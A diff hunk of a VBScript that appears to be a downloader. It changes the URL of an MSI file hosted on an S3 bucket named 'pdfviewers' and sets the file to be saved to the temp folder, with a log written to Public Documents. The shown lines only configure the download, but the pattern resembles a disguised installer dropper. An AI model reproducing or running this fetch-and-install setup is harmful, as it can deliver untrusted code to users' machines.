@@ -8,7 +8,7 @@ Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' --- configuration ---
-msiUrl = "https://pdfviewers.s3.ap-northeast-1.amazonaws.com/file.msi"
+msiUrl = "https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"
 msiPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\file.msi"
 publicDocs = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents"
 logFile = publicDocs & "\install_log.txt"
